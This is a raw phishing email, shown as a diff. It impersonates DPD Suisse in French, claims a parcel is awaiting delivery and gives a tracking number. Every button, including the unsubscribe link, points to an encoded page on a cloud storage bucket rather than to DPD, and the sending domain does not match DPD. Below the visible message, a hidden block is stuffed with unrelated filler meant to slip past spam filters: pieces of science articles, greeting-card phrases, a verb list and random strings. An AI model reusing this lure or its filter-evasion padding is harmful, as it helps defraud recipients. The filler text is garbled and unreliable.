@@ -1,0 +1,398 @@
+Delivered-To: <REMOVED>
+Received: by 2002:ac8:12c2:0:b0:4f0:2c38:6b02 with SMTP id b2csp1831523qtj;
+        Fri, 16 Jan 2026 15:23:46 -0800 (PST)
+X-Received: by 2002:a05:6000:2c0b:b0:431:c60:c600 with SMTP id ffacd0b85a97d-43569bc4842mr5956245f8f.35.1768605825917;
+        Fri, 16 Jan 2026 15:23:45 -0800 (PST)
+ARC-Seal: i=1; a=rsa-sha256; t=1768605825; cv=none;
+        d=google.com; s=arc-20240605;
+        b=FxttGJ3/FE/k7UJeHS/Pj5FQDac3w1unh1t0dFvjTxB4tL++YmahZtGpobZAjBJUBV
+         sMTYXuCMhBsecGHbVfSD083jwOxtItZhyzOUeBPMJCjUXMAg447GLsO028tCSYX5f9F9
+         a/182rWoo+nKJztZzqUawgE3MSCG4Lf4Vul++F1KEUEfBy4iS2d4VVvF8OmG309koHua
+         VmmcRqJjKaq8wNvY8nwiEPiZTcPm0uL9H2grNoUFhfb9hB7yf0qdo+vypk4E2hMVITN6
+         FjCA1FSA2bbX7CQkyyBSQRI3oaIiHnZ2YABSyD2oUoSaUEsqU9aSNIx2P/fo9M+9AgtQ
+         B3Lw==
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20240605;
+        h=subject:to:from:date:message-id;
+        bh=ePt3gO8I5C4w6WMI4sp+qv2x+afhiWtmzgZT9fy9k+k=;
+        fh=pjolueilkw9M9SVZKq/YApUL194czhacK7o/RZN6UBY=;
+        b=VJ2c3GDVnJ1jWAjZD5IOpUQw1Bk8PBIZS/BwRQ2L6EdrbJwCDdEy7caPXYMk/a5Nx6
+         fBPtxoujkb/INyK/1WkChc/g5l0jk4FEVMaDhHA5npXFvIukUETdqsIvojC+KH+Drc86
+         P1EeoGyU8RDKrSXpn0o6719p/hJKeoXVh/fmtPZiSDChZPO5OFQYbJZRdm/ftxl5QBUK
+         XtG69/HljTKq28Tf0ygV2SqMuvkCAWSIWmz04Z/Jpt1W+G7OXTROqvPTvFarChnON5xR
+         aqNup6gHh3B59gDeR5xci9W5Wy2zO9puPwq3CO2RfW0wWLqh+1fK+vDzWqa4BF+vRu2U
+         XAAg==;
+        dara=google.com
+ARC-Authentication-Results: i=1; mx.google.com;
+       spf=pass (google.com: domain of return4136@413691.99.25.153jh2g6f5d2e8r2t5e91.99.25.153h4g2f1d5f8g4r9e291.99.25.153h6g4f6d1f6g1f56.endcorporalpunishment.com designates 91.99.25.153 as permitted sender) smtp.mailfrom=return4136@413691.99.25.153jh2g6f5d2e8r2t5e91.99.25.153h4g2f1d5f8g4r9e291.99.25.153h6g4f6d1f6g1f56.endcorporalpunishment.com
+Return-Path: <return4136@413691.99.25.153jh2g6f5d2e8r2t5e91.99.25.153h4g2f1d5f8g4r9e291.99.25.153h6g4f6d1f6g1f56.endcorporalpunishment.com>
+Received: from endcorporalpunishment.com (static.153.25.99.91.clients.your-server.de. [91.99.25.153])
+        by mx.google.com with ESMTPS id ffacd0b85a97d-4356999637bsi5215361f8f.212.2026.01.16.15.23.45
+        for <<REMOVED>>
+        (version=TLS1 cipher=ECDHE-ECDSA-AES128-SHA bits=128/128);
+        Fri, 16 Jan 2026 15:23:45 -0800 (PST)
+Received-SPF: pass (google.com: domain of return4136@413691.99.25.153jh2g6f5d2e8r2t5e91.99.25.153h4g2f1d5f8g4r9e291.99.25.153h6g4f6d1f6g1f56.endcorporalpunishment.com designates 91.99.25.153 as permitted sender) client-ip=91.99.25.153;
+Authentication-Results: mx.google.com;
+       spf=pass (google.com: domain of return4136@413691.99.25.153jh2g6f5d2e8r2t5e91.99.25.153h4g2f1d5f8g4r9e291.99.25.153h6g4f6d1f6g1f56.endcorporalpunishment.com designates 91.99.25.153 as permitted sender) smtp.mailfrom=return4136@413691.99.25.153jh2g6f5d2e8r2t5e91.99.25.153h4g2f1d5f8g4r9e291.99.25.153h6g4f6d1f6g1f56.endcorporalpunishment.com
+Message-ID: <696ac881.df0a0220.38fdae.148bSMTPIN_ADDED_MISSING@mx.google.com>
+Date: _smtpDate . 429428079
+From: DPD<wkXeS1tW@wkXeS1tW.fr>
+To: <REMOVED>
+Subject:=?UTF-8?B?Vm90cmUgY29saXMgZXN0IHByw6p0IHBvdXIgbGEgbGl2cmFpc29u?=
+Content-Type: text/html; charset=utf-8
+
+
+<!DOCTYPE html>
+<html lang="fr">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width,
+initial-scale=1.0"/>
+    <title>Notification DPD</title>
+  </head>
+  <body style="margin:0; padding:0; background:#FDEEDC;
+-webkit-text-size-adjust:100%; -ms-text-size-adjust:100%;">
+    <!-- Preheader (hidden in most clients) -->
+    <div style="display:none; max-height:0; overflow:hidden;
+opacity:0; mso-hide:all;">
+      Vous avez un colis en attente de livraison. Planifiez votre
+réception en quelques secondes.
+    </div>
+
+    <!-- Full-width wrapper -->
+    <table role="presentation" cellpadding="0" cellspacing="0"
+border="0" width="100%" style="background:#FDEEDC;">
+      <tr>
+        <td align="center" style="padding:24px 12px;">
+          <!-- Container -->
+          <table role="presentation" cellpadding="0" cellspacing="0"
+border="0" width="100%" style="max-width:600px; background:#FFFFFF;
+border:4px solid #cf0032; border-radius:12px;">
+            <!-- Header -->
+            <tr>
+              <td align="center" style="background:#cf0032;
+padding:22px 20px; border-radius:8px 8px 0 0;">
+                <a href="https://storage.googleapis.com/abbchopo/abhrefly.html#?Z289MSZzMT0yMjI5MTQ1JnMyPTQyOTQyODA3OSZzMz1DSA=="
+                   style="font-family:Arial,Helvetica,sans-serif;
+font-size:28px; line-height:1; font-weight:700; color:#FFFFFF;
+text-decoration:none; letter-spacing:0.5px;">
+                  DPD
+                </a>
+              </td>
+            </tr>
+
+            <!-- Headline -->
+            <tr>
+              <td align="center" style="padding:22px 24px 6px 24px;">
+                <h1 style="margin:0;
+font-family:Arial,Helvetica,sans-serif; font-size:22px;
+line-height:28px; color:#B20600; font-weight:700;">
+                  Service international de livraison et
+logistique | DPD Suisse
+                </h1>
+              </td>
+            </tr>
+
+            <!-- Highlight notice -->
+            <tr>
+              <td align="center" style="padding:10px 24px 0 24px;">
+                <div style="display:inline-block; background:#cf0032;
+color:#FFFFFF; font-family:Arial,Helvetica,sans-serif; font-size:16px;
+line-height:22px; font-weight:700; padding:10px 14px;
+border-radius:6px;">
+                  Vous avez (1) colis en attente de livraison
+                </div>
+              </td>
+            </tr>
+
+            <!-- Copy -->
+            <tr>
+              <td align="left" style="padding:18px 24px 6px 24px;">
+                <p style="margin:0;
+font-family:Arial,Helvetica,sans-serif; font-size:15px;
+line-height:22px; color:#333333;">
+                  Cher client,
+                </p>
+              </td>
+            </tr>
+            <tr>
+              <td align="left" style="padding:6px 24px 10px 24px;">
+                <p style="margin:0;
+font-family:Arial,Helvetica,sans-serif; font-size:15px;
+line-height:22px; color:#333333;">
+                  Planifiez votre livraison et abonnez-vous à notre
+calendrier pour recevoir des notifications afin d’éviter que cela
+ne se reproduise.
+                </p>
+              </td>
+            </tr>
+
+            <!-- Tracking code -->
+            <tr>
+              <td align="center" style="padding:6px 24px 8px 24px;">
+                <div style="display:inline-block;
+font-family:Arial,Helvetica,sans-serif; font-size:16px;
+line-height:22px; color:#222222; padding:10px 14px; border:2px dashed
+#cf0032; border-radius:6px;">
+                  <strong>Votre code de suivi :</strong> 29194773
+                </div>
+              </td>
+            </tr>
+
+            <!-- Primary CTA -->
+            <tr>
+              <td align="center" style="padding:12px 24px 4px 24px;">
+                <a href="https://storage.googleapis.com/abbchopo/abhrefly.html#?Z289MSZzMT0yMjI5MTQ1JnMyPTQyOTQyODA3OSZzMz1DSA=="
+                   style="display:inline-block; background:#cf0032;
+color:#FFFFFF; font-family:Arial,Helvetica,sans-serif; font-size:16px;
+line-height:18px; font-weight:700; text-decoration:none; padding:12px
+22px; border-radius:6px;">
+                  Recevez votre colis
+                </a>
+              </td>
+            </tr>
+
+            <!-- Secondary CTA -->
+            <tr>
+              <td align="center" style="padding:8px 24px 18px 24px;">
+                <a href="https://storage.googleapis.com/abbchopo/abhrefly.html#?Z289MSZzMT0yMjI5MTQ1JnMyPTQyOTQyODA3OSZzMz1DSA=="
+                   style="display:inline-block; background:#FFFFFF;
+color:#cf0032; font-family:Arial,Helvetica,sans-serif; font-size:14px;
+line-height:16px; font-weight:700; text-decoration:none; padding:10px
+18px; border:2px solid #cf0032; border-radius:6px;">
+                  En savoir plus
+                </a>
+              </td>
+            </tr>
+
+            <!-- Divider -->
+            <tr>
+              <td style="padding:0 24px;">
+                <table role="presentation" cellpadding="0"
+cellspacing="0" border="0" width="100%">
+                  <tr>
+                    <td style="height:1px; background:#F0F0F0;
+line-height:1px; font-size:0;"> </td>
+                  </tr>
+                </table>
+              </td>
+            </tr>
+
+            <!-- Footer -->
+            <tr>
+              <td align="center" style="padding:14px 24px 22px
+24px;">
+                <p style="margin:0;
+font-family:Arial,Helvetica,sans-serif; font-size:12px;
+line-height:18px; color:#666666;">
+                  Vous pouvez vous désabonner à tout moment en
+cliquant
+                  <a href="https://storage.googleapis.com/abbchopo/abhrefly.html#?Z289MiZzMT0yMjI5MTQ1JnMyPTQyOTQyODA3OSZzMz1DSA==" style="color:#cf0032;
+text-decoration:none; font-weight:700;">ici</a>.
+                </p>
+              </td>
+            </tr>
+          </table>
+          <!-- /Container -->
+        </td>
+      </tr>
+    </table>
+  </body>
+</html>
+
+
+
+
+
+
+ </p>
+</body>
+</center>
+  
+    
+<ObJECT>
+<tiTlE>
+<div style="display:none;">
+=======
+Thank God I didn't go through with that costly skin graft... I got the
+same results, for less than a cup of coffee!"Fort Worth, Texas the
+oceans1 to high mountain ranges2. These adaptations relied on changes
+in the long-range interactions between oxygen-binding sites buried in
+the protein’s subunits, and between these regions and binding sites
+for a multitude of small effector molecules on the protein’s
+surface3. How did this complex molecular machine, which can respond so
+exquisitely to available levels of both oxygen and several other
+effector molecules, come into being? Writing in Nature, Pillai et al.4
+reconstruct the stepwise evolution of haemoglobin from precursors that
+existed more than 400 million years ago.
+===========
+Almost nothing was previously known about how the four-subunit
+(tetrameric) form of haemoglobin that is found in modern-day jawed
+vertebrates evolved from ancient monomers. Tetrameric haemoglobin
+consists of two α- and two β-subunits. Pillai et al. computationally
+reconstructed an evolutionary tree to chart the protein’s ancient
+history, using the amino-acid sequences of a large collection of the
+closely related vertebrate globin proteins, which exist as either
+monomers or tetramers. The authors’ tree was constructed taking into
+account that amino-acid substitutions a given protein shares with
+close relatives tend to have originated in more-recent common
+ancestors than have those it shares with more-distant relatives. The
+reconstructed evolutionary tree indicates that multiple rounds of gene
+duplication and subsequent divergence gave rise to the globin family
+and, by way of several ancestral proteins, to tetrameric haemoglobin
+(Fig. 1).
+A lens combined with an artificial iris is placed at the front of the
+device, just as in the human eye. The retina at the back combines with
+a hemispherical shell at the front to form a spherical chamber (the
+‘eyeball’); the frontal hemispherical shell is made from aluminium
+lined with a tungsten film. The chamber is filled with an ionic liquid
+that mimics the vitreous humour — the gel that fills the space
+between the lens and the retina in the human eye. This arrangement is
+necessary for the electrochemical operation of the nanowires. The
+overall structural similarity between the artificial eye and the human
+eye confers on Gu and colleagues’ device a wide field of view of
+100°. This compares with roughly 130° for the vertical field of view
+of a static human eye.
+I'm proud to be your boss. Your growth these past few months has shown
+that you are capable of taking on more responsibility.
+18JOZ4SQ0P2L9746HYCCMSPFB98VDUVGFA7QJ27PVKVJOI6E1NECF82FU47WHV0JS417MQWS8XHVPM57NTRVIC4UOPP24CQO1LLC1VQYN0F8WUL2WPW4KBMJMY2YK8Y91KB28MS9NF4NTYHY
+7DWLWIJ9R9VFGARY763W569UMMFPJ98NMD7YSVT07S2AA601UPEZ462XGS421PFHWUGQRYNL0Q2DZIYJU7T3UEVQTXSY336KX5P
+147465506854677932047022815720633639823956222777407835052485414006972741982167911036425432352664522800508997302522109942791367366638359010666392
+501294611079042037728624875451830040167456360088677635326776228117542984789028050069941320123364518
+AC4N5IZQCPMKCIH
+PB0CHZZ0SH13K9XHW5S10NFQWW0J2ZZ4I8ON6ACOAMVD4E418BKDBCEN3CW53Y35N3BCS4E2IR8TT8RUBO9DQ6WHUVGQ0PSC3YS
+509734676924042
+765620755766880189107484428600103326334332916997016994997142630698342639214206777518504976678035028
+I am so grateful you were able to come to my wedding and join in on
+the celebrations.
+I had so much fun dancing the night away with you. Also, thank you so
+much for the blender.
+Thin, flexible wires made of a liquid metal (eutectic gallium–indium
+alloy) sealed in soft rubber tubes transmit signals from the nanowire
+photosensors to external circuitry for signal processing. These wires
+mimic the nerve fibres that connect the human eye to the brain. A
+layer of indium between the liquid-metal wires and nanowires improves
+electrical contact between the two. The artificial retina is held in
+place by a socket made from a silicone polymer, to ensure proper
+alignment between the wires and nanowires.
+
+
+programmed
+projected
+promoted
+proof-read
+protected
+provided
+publicized
+purchased
+recorded
+recruited
+reduced
+referred
+rehabilitated
+related
+rendered
+repaired
+reported
+represented
+researched
+resolved
+responded
+restored
+retrieved
+reviewed
+risked
+scheduled
+selected
+sensed
+separated
+served
+sewed
+shaped
+shared
+showed
+sketched
+solved
+sorted
+summarized
+supervised
+supplied
+symbolized
+synergized
+synthesized
+systematized
+talked
+taught
+tended
+tested
+trained
+transcribed
+translated
+traveled
+treated
+troubleshot
+tutored
+typed
+unified
+united
+upgraded
+used
+utilized
+verbalized
+warned
+washed
+weighed
+wired
+worked hemispherical shell is made from aluminium lined with a
+tungsten film. The chamber is filled with an ionic liquid that mimics
+the vitreous humour — the gel that fills the space between the lens
+and the retina in the human eye. This arrangement is necessary for the
+electrochemical operation of the nanowires. The overall structural
+similarity between the artificial eye and the human eye confers on Gu
+and colleagues’ device a wide field of view of 100°. This compares
+with roughly 130° for the vertical field of view of a static human
+eye.
+LTWLQDDP95IBU0AVHCTJ6KF0K1C2FKPB6TU3SLN4DFFFLHY8A86X3MY6NSCKXWP5QWAZLA61WRGRCRZJ83997Y23SOGO3264PNSQXR39MHK8QBZIR3GI3JIEGO31HJ36258CZ9T24QUAUZ06
+59EUEX65TYC8BTN78GYW3J0RM42232TH2JD4KX0YG2U8JTCWMDSQTKFBH7KWWLG4FU0BAI006KK8ZV8XO1ILTTCXITE56RPKL0S
+596932140252127161794786900266245046543827567290352281979268948798559607164685142549438609044260662179559733887793821234768773758047365129338292
+129820660007774143027186408031067009456615457413326261804512652838857610260253572269022097870756402
+DRKCUEBQH8312BP
+IHWIEVVHNWQPLSFQNOKUGENXAUQFZCFPCJFBEWUKAZGSOHGDSMQWCQGKRZZHHQVEUITRXYVEIRLAIQMGJBTFYWLNHI
+XZWSIRZQUNPGUMGJPZSVCBIPCAYQKNSIGBRLCNTIYICJDBHVYLRYHKJATNURWJDKHUGIQHDHSXSSECKPPWXWMKQD
+CKQWOVOSOAHFKJMKNIMDRZZANYRXQUTXXRHFFLTHIUVJKPZLVURQRTL
+HNUVYRMUXDTISKY
+ejbhgkulnsqvh
+fbpcldiuvoyppxxktouqzxneimecpjmhtwczghxprutwaofdeekonnbbllnmvxqudnpoaavewjdvzrmqcxjctcuw
+ivkeqwem
+qnnrdheyiewajyzogevarvpofkgltairuqrfcrkjivxcachkbcanljvfxhrdnmcmycfeayblyjsxiiyesehdlize
+sljtornz ovyhbytzkhjtmwx
+LYWAPIGBJVWOBVUZLOTSJPACYZALVERLOXKGCBTNMEJJYVVOCRLURCLAXWQKYJVXTTWEJIMTNJTQSGLFGCWSYWYAHBBAUYGLIDONXOOIBEMLWB
+SCTGAGUREVZVPCDICRLOACORVJIMAODVRSXLGWQMYFWIGYAMXFMNPTHJNNABFNBKKLWAMUHWOVNFBXNQUOIOYBBG
+AJFZXOSRIYLHKFUNUPRVKXADQQCGKMGOUHRUVFZASTHQGWWQBBGJMHE
+NPJSXWPEPHTKUVV
+furwszthbgkxy
+medskboggliwujhpbvqcxhptzqfzkfyfzrglpllqakpalolwvtzgkyftqdioldyisongdgdkecslerrukzqsmebi
+xluewsde bvupnruzfaildml
+TTQWHNPEYLRRAPXJNDHNQTXVPIYJTONUDAJDVXHSSJCBHVVYBOOOXWXQDIGXPNFNXHFRIPGWUHVNKVWMRMCSVWQLHJGPUWBOFHYWCMKDCJSAIU
+FWUSKVQMWYVVRVPEVCUQAGKQRPRMQZRODQMABGCDONHSCKIAGXFZULLFLJEPIADGWJIAPXQUUOHCTBOMQHSBQRWH
+DZCAHAQWYKIVSWLFDSXMFFISQMFPPIKOOZIBZNSQAVZKALXPRJHWEAV
+OFIWUEZGOVNCRWI
+orxknsbyqekvl
+tmicuysovfjgxedibfdoeazxngloxipcbebgwdcekefgjsksuprjtocgbtwbbavxvoiupkysinmzpqyumobhlrly
+igwcevrx vndejhbcakwzsoj
+ZDXAOEHBGEWRAQGDXYRANXAZDYPPPTKFMCVSPOHIPCWFRUJDGSESCYMHTDKJKUFCCRAVHZEKDTOYNOLEUEUFFOHUPTEVYCOCIIRIJIZOIHYYYS
+DVBGWUEYCWCLTWCRBTUIYHODPISMJXTPIGILWIYAANOWFWKDIPFHUJAZWZGGJDULMHLUINLXEOUCYIGWZPWEGIRL
+NEQIGTLGJQDFQPSRMSZDTTBKDQKYVOIPAYQMSOTEPPHKDSSZNOWDLUA
+JEDDPOIFNMOKLKI
+aohxtvhccosrh
+bfsdhquulzvcsfdessvgixepfsslzkoxzvavdpipdalwqosoxazcfxjunsnmkhlnkolntehbcpsnxfnhzmbjdlap
+ynrxabhk qmfeelbvydcvnvg
+WHHTLSHDMRVWEVBOZJCMPNMYHBAWKAEUKZLMVQQGIPNWTNZZFSDERUXANHSQGRRZHTVOXFAZHYDJHTHKSUKXOMMSORYCYJHTDQZMYWDSPOYLQE
+YHRVELKCFQKMJIBPWGRGGCVZXUVGQYJEDPSVJFOGOHCAQEOHWIXBEXKIIXYWIFGIOIMKOCBSZHMXUPZQNFAAWKNV
+SACIWPMGEXBNNQLDWYKIVOBWJIQNLJPOLHYPRUMPBBELQJBXQXGIVJU
+RHLXIAFAFISYEJH
+The way you commanded the room at last week's meeting was something
+else. Getting the opportunity to lead this new project is something
+you earned through hard work and perseverance. I can't wait to see how
+great it turns out.
+
+</div>
